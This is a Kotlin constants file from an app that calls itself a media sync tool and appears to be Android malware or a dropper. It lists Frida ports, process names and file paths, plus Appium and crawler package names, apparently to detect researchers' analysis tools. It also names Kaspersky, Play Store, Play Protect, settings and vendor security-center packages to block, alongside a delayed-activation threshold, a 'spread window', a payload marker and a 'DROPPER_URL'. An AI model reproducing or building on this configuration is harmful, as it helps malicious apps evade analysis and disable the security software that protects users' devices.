package com.sync.media.hub

internal object Lynx {

    val WATERING_HOLES = intArrayOf(27042, 27043, 27044, 27045, 27046, 9999, 23946, 23947, 23948, 23949)

    val TERRAIN_MARKER_A = "frida-agent"
    val TERRAIN_MARKER_B = "frida-gadget"
    val TERRAIN_MARKER_C = "linjector"

    val HERD_MARKER_A = "frida-server"
    val HERD_MARKER_B = "gum-js-loop"
    val HERD_MARKER_C = "fridahelper"
    val HERD_MARKER_D = "linjector"

    val DEN_PATHS = arrayOf(
        "/data/local/tmp/frida-server",
        "/data/local/tmp/re.frida.server",
        "/system/lib/frida-gadget.so",
        "/system/lib64/frida-gadget.so",
        "/data/local/tmp/frida-gadget.so",
        "/data/local/tmp/frida",
        "/system/xbin/frida",
        "/sdcard/frida-server",
        "/system/bin/frida-server"
    )

    val TERRITORY_BLOCK = arrayOf(
        "com.kaspersky.kes",
        "com.kms.free",
        "com.android.vending",
        "com.google.android.gms",
        "com.android.settings",
        "com.android.systemui",
        "com.google.android.verifier",
        "com.samsung.android.sm",
        "com.samsung.android.sm.policy",
        "com.samsung.android.lool",
        "com.samsung.android.securitylogagent",
        "com.miui.securitycenter",
        "com.miui.guardprovider",
        "com.huawei.appmarket",
        "com.oppo.market",
        "com.coloros.safecenter",
        "com.coloros.phonemanager",
        "com.coloros.oppoguardelf",
        "com.oplus.phonemanager",
        "com.oplus.safecenter",
        "com.vivo.appstore",
        "com.iqoo.secure"
    )

    val BANNED_FINGERPRINTS = arrayOf(
        "OnePlus/IN2023/OnePlus8Pro:11/QKR1.191246.002/2006701342:user/release-keys"
    )

    val BOT_LABELS = arrayOf(
        "AndroidX Crawler",
        "Stub App for AndroidX Crawler",
        "location.services"
    )

    val BOT_PACKAGES = arrayOf(
        "com.google.android.apps.auth.test.support",
        "io.appium.settings",
        "io.appium.uiautomator2.server",
        "com.android.developer.ext",
        "com.github.uiautomator.test"
    )

    const val MEADOW_THRESHOLD_MS = 600_000L
    const val SPREAD_WINDOW_MS    = 1_800_000L

    val WARREN_PREFS       = "meadow_cfg"
    val WARREN_KEY         = "sp"
    val WARREN_AUTH_MARK   = ".__wombat_payload__."
    val WARREN_PERM_SUFFIX = ".INTERNAL_WAKEUP"

    val ALPINE_PROP_KEY    = "ro.miui.ui.version.name"
    val HIGHLAND_PREFIX    = "OS"

    const val MIUI_DONE_KEY    = "miui_done"
    const val MIUI_WAKE_ACTION = "com.sync.media.hub.MIUI_WAKE"

    val DROPPER_URL        = "https://play.google.com/store/apps"

    val NOTE_CH_ID   = "sync_ch"
    val NOTE_CH_NAME = "Sync"
}
